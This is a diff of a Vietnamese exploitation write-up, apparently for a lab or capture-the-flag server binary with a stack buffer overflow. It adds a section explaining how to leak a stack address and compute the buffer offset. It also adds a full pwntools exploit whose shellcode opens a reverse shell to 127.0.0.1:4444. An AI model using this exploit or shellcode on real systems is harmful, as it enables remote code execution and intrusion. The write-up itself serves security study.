@@ -189,14 +189,16 @@ undefined8 input(int fd)
 }
 ```
 * `input()` read() một giá trị lớn vào buffer
-* `handle_client()` có read() vào buffer với size lớn hơn kích thước của buffer
-  ```c
-  undefined1 buffer [512];
-  ...
-  ...
-  read(fd,buffer,3840);
-  ```
-  -> khả năng BOF ở đây, và có thể đẩy payload vào đây
+* `handle_client()`
+  * có write() đọc dữ liệu thô từ stack, dùng để leak address
+  * có read() vào buffer với size lớn hơn kích thước của buffer
+    ```c
+    undefined1 buffer [512];
+    ...
+    ...
+    read(fd,buffer,3840);
+    ```
+    -> khả năng BOF ở đây, và có thể đẩy payload vào đây
 
 Mô phỏng kết nối từ client bằng cách kết nối qua một terminal khác:
 
@@ -208,8 +210,127 @@ Mô phỏng kết nối từ client bằng cách kết nối qua một terminal 
 
   <img width="804" height="119" alt="image" src="https://github.com/user-attachments/assets/c126cf1c-4899-481f-ac79-9720f2fea27e" />
 
+___
+**Khai thác:**
+* Ta sẽ write() trước để leak địa chỉ stack
+* Tính offset đến buffer
+* Sau đấy sẽ read(), đấy shellcode vào phần bộ nhớ của buffer trên stack
+* overflow và overwrite RIP với địa chỉ buffer tính được
+
+Thấy trên stack của ./server, có tồn tại địa chỉ stack, libc:
+```
+0x7fffffffda60: buffer
+...
+0x7fffffffdaa0 —▸ 0x7fffffffdbf0: địa chỉ stack 
+0x7fffffffdaa8 —▸ 0x7ffff7e02290 (__printf_buffer_to_file_done+16): libc
+0x7fffffffdab0 —▸ 0x7ffff7f905c0 (_IO_2_1_stdout_)
+0x7fffffffdab8 —▸ 0x7ffff7e0cf99 (__vfprintf_internal+553): libc           
+```
+<img width="820" height="572" alt="image" src="https://github.com/user-attachments/assets/91a32c23-070c-4e87-abee-9ac8a0f0f92a" />
+
+<img width="807" height="276" alt="image" src="https://github.com/user-attachments/assets/659023d4-142e-47cc-bff5-ac9501734244" />
+Dùng địa chỉ stack tính offset đến buffer:
+```
+pwndbg> p/x 0x7fffffffdbf0 - 0x7fffffffda60
+$1 = 0x190
+```
 
 
+script:
+```python
+from pwn import *
+
+context.arch = "amd64"
+context.os   = "linux"
+context.log_level = "debug"
+
+p = remote("localhost", 1337)
+
+p.recvuntil(b"input your name: ")
+p.sendline(b"AAAA")
+
+p.sendlineafter(b"Input something to start: ", b"write")
+
+data_leak = p.recvuntil(b"Input something")
+
+addr = data_leak[0x40:0x48]
+addr = u64(addr.ljust(8, b"\x00"))
+print(f"addr: {hex(addr)}")
+buffer_addr = addr - 0x190
+print(f"buffer_addr: {hex(buffer_addr)}")
+
+# addr2 = data_leak[0x90:0x98]
+# addr2 = u64(addr2.ljust(8, b"\x00"))
+# print(f"addr2: {hex(addr2)}")
+# buffer_addr2 = addr2 - 0xc0
+# print(f"buffer_addr2: {hex(buffer_addr2)}")
+
+shellcode = asm("""
+		mov rax, 41
+		mov rdi, 2
+		mov rsi, 1
+		mov rdx, 0
+		syscall
+
+		mov rbx, rax
+
+		mov rdx, 0x0100007f
+		push rdx
+		mov dx, 0x5c11
+		push dx
+		mov dx, 2 
+		push dx
+
+		mov rax, 42
+		mov rdi, rbx 
+		mov rsi, rsp 
+		mov rdx, 16  
+		syscall
+
+		mov rax, 33
+		mov rdi, rbx
+		mov rsi, 0
+		syscall
+
+		mov rax, 33
+		mov rdi, rbx
+		mov rsi, 1
+		syscall
+
+		mov rax, 33
+		mov rdi, rbx
+		mov rsi, 2
+		syscall
+
+		mov rbx, 0x68732f6e69622f
+		push rbx
+
+		mov rax, 59
+		mov rdi, rsp
+		mov rsi, 0
+		mov rdx, 0
+		syscall
+	""")
+
+nop_sleds = b"\x90" * 20 # just in case 
+payload = nop_sleds + shellcode
+payload += b"A" * (512 - len(payload))
+## to rip
+## offset_to_rip = 0x7fffffffdcc8 - 0x7fffffffda60
+offset_to_rip = (616 - 512)
+payload += b"A" * offset_to_rip
+
+# da60
+payload += p64(0x7fffffffda60)
+print(f"payload_len: {len(payload)}")
+
+p.sendlineafter(b"to start: ", b"read")
+p.send(payload)
+
+p.shutdown("send") # dong ket noi de ham RET -> rip tro den shellcode
+
+p.interactive()
+```
 ___
 Tài liệu:
 
